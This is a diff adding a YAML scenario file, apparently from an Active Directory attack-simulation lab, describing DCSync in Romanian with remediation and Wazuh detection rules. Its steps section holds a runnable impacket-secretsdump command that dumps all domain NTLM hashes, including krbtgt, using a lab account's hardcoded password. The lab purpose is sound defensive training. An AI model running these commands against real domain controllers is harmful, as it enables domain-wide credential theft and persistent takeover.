@@ -1,0 +1,100 @@
+id: dcsync
+name: DCSync
+category: credential_access
+mitre: T1003.006
+
+description: |
+  DCSync abuzeaza protocolul de replicare Active Directory (Directory
+  Replication Service - DRS) pentru a extrage hash-urile parolelor
+  direct de la Domain Controller, fara a rula cod pe DC.
+
+  In mod normal, DRS e folosit intre Domain Controllers pentru a
+  sincroniza baza de date AD. Practic, cand o parola se schimba pe
+  DC1, acesta trimite hash-ul nou catre DC2 printr-un apel RPC numit
+  GetNCChanges — asa raman toate DC-urile la zi. DC-ul care primeste
+  cererea nu verifica daca cel care intreaba e cu adevarat un alt DC;
+  verifica doar daca contul are drepturile de replicare. Orice cont cu drepturile:
+    - DS-Replication-Get-Changes
+    - DS-Replication-Get-Changes-All
+  poate cere DC-ului sa "replice" (trimita) hash-urile oricarui cont,
+  inclusiv krbtgt si Administrator.
+
+  Tool Kali: impacket-secretsdump
+
+misconfiguration_general: |
+  Conturi cu privilegii excesive in Active Directory:
+    - Domain Admins au implicit drepturile de replicare
+    - Parolele conturilor privilegiate sunt slabe sau neschimbate
+    - Nu exista monitorizare pe cererile de replicare neobisnuite
+
+  Comanda aplicata pe Windows Server:
+    Add-ADGroupMember -Identity "Domain Admins" -Members "it.admin"
+
+misconfiguration_specific: |
+  Contul it.admin (Corp_IT) este membru al grupului Domain Admins,
+  ceea ce ii confera automat drepturile DS-Replication-Get-Changes si
+  DS-Replication-Get-Changes-All.
+
+  Parola it.admin: kkk12345$ (slaba, permite autentificarea atacatorului)
+
+  Output asteptat: hash-urile NTLM pentru toti utilizatorii din AD,
+  inclusiv Administrator si krbtgt (contul folosit pentru Golden Ticket).
+
+remediation: |
+  1. Principiul least-privilege: scoate conturile din Domain Admins
+     daca nu au nevoie de toate privilegiile:
+     Remove-ADGroupMember -Identity "Domain Admins" -Members "it.admin"
+
+  2. Auditeaza cine are drepturi de replicare.
+
+  3. Monitorizeaza Event ID 4662 cu GUIDs:
+     {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes)
+     {1131f6ad-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes-All)
+
+  4. Roteste periodic parola contului krbtgt (invalideaza Golden Tickets
+     existente):
+     Set-ADAccountPassword -Identity krbtgt -Reset -NewPassword (...)
+
+parameters:
+  - name: dc_ip
+    label: "IP Domain Controller"
+    default: "10.10.128.2"
+    required: true
+  - name: domain
+    label: "Domeniul AD (FQDN)"
+    default: "corp.local"
+    required: true
+  - name: username
+    label: "User cu privilegii DA"
+    default: "it.admin"
+    required: true
+  - name: password
+    label: "Parola userului"
+    default: "kkk12345$"
+    required: true
+
+steps:
+  - run_on: kali
+    description: "Curata fisierele temporare din rulari anterioare"
+    command: "rm -f /tmp/dcsync_out.txt /tmp/dcsync_hashes.txt"
+
+  - run_on: kali
+    description: "Extrage hash-urile prin DCSync (impacket-secretsdump)"
+    command: "impacket-secretsdump {{domain}}/{{username}}:'{{password}}'@{{dc_ip}} -just-dc-ntlm 2>&1 | tee /tmp/dcsync_out.txt"
+    expect_nonzero_ok: true
+
+  - run_on: kali
+    description: "Filtreaza si afiseaza hash-urile NTLM obtinute"
+    command: "grep -E '^[^:]+:[0-9]+:[a-f0-9]{32}:[a-f0-9]{32}' /tmp/dcsync_out.txt | tee /tmp/dcsync_hashes.txt && echo \"--- $(wc -l < /tmp/dcsync_hashes.txt) hash(uri) extrase ---\""
+    expect_nonzero_ok: true
+
+detection:
+  wazuh_rules:
+    - id: 92652
+      description: "Successful Remote Logon via NTLM - autentificare it.admin pe DC"
+    - id: 67028
+      description: "Special privileges assigned to new logon - cont privilegiat (Event ID 4672)"
+    - id: 60106
+      description: "Windows Logon Success"
+  mitre_technique: T1003.006
+  mitre_description: "OS Credential Dumping: DCSync"
